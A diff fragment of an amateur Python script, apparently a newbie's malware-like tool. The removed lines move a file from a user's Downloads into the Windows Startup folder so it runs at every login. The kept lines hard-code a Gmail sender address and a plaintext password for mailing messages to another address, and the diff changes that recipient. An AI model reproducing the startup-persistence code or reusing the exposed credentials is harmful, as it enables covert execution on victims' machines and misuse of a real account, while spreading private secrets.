@@ -7,18 +7,11 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
 #THIS FILE MADE BY NEWBIE AND USE TO ...  SATISFACTION..
-try :
-        e = input('Please enter your computer name : ') 
-        shutil.move('C:/Users/'+str(e)+'/Downloads/faqs','C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp')
-except  :
-        print('This is not your computer name ')
-        e = input('Please enter your computer name : ') 
-        shutil.move('C:/Users/'+str(e)+'/Downloads/faqs','C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp')
 
 subject = "If you see that, the code is working correctly"
 body = "If you open and see the file true to the description, the code is working correctly"
 sender_email = "nghiepha943@gmail.com"
-receiver_email = "ong.hao.tranvan@gmail.com"
+receiver_email = "hainguyenlien08642@gmail.com"
 password = 'urpayyiddswbopep'
 
 # Create a multipart message and set headers
